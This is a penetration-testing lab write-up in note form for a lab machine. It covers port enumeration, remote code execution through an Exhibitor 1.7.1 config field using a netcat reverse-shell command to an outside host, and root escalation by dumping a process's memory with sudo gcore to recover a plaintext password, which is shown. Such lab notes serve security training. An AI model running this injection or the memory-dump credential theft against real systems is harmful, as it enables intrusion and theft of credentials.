### Enumeration
```
IP=192.168.158.98
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,139,445,631,2181,2222,8080,8081,37753 -A $IP
```
#### Ports 
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 139
	- Samba smbd 3.X - 4.X
- 445
	- Samba smbd 4.9.5-Debian
- 631
- 2181
	- Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
- 2222
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 8080
	- Jetty 1.0
- 8081
	- nginx 1.14.2
- 37753
	- Java RMI
- OS: Linux
### Foothold
- 445
	- smbclient -N -L //$IP
		- Login successful
		- shares
			- print$
			- IPC$
	- nmap --script smb-vuln* -p139,445 $IP
- 8080
	- ![[Pasted image 20240627090510.png]]
	- dirsearch -u http://$IP:8080
		- `/application.wadl`
			- xml file with exhibitor pathing
	- dirsearch -u http://$IP:8080/exhibitor/v1
		- nothing
	- Config
		- ![[Pasted image 20240627090946.png]]
		- Uses log4j
	- Version
		- exhibitor 1.0
			- Exhibitor Web UI 1.7.1 - Remote Code Execution
				- In config tab, edit java.env script field
					- `$(/bin/nc -e /bin/sh 192.168.45.195 8000 &)`
					- Then we get a reverse shell back
- 8081
	- Redirects to: http://192.168.158.98:8080/exhibitor/v1/ui/index.html
	- ![[Pasted image 20240627090521.png]]
	- dirsearch -u http://$IP:8081
### PE
#### Linux
- Charles
	- id
		- uid=1000(charles) gid=1000(charles) groups=1000(charles)
	- sudo -l
		- (ALL) NOPASSWD: /usr/bin/gcore
		- GTFO Bin
			- `sudo gcore $PID`
			- Tried commands and did not work
			- `usage:  gcore [-a] [-o filename] pid`
			- ps -aux
			- find interesting process
				- /usr/bin/passwo  -  484
			- sudo gcore 484
			- strings core.484
				- ![[Pasted image 20240627094439.png]]
			- su root
				- ClogKingpinInning731 
				- successful
	- uname -a
	- capabilities
	- suid
	- linpeas
### Lessons Learned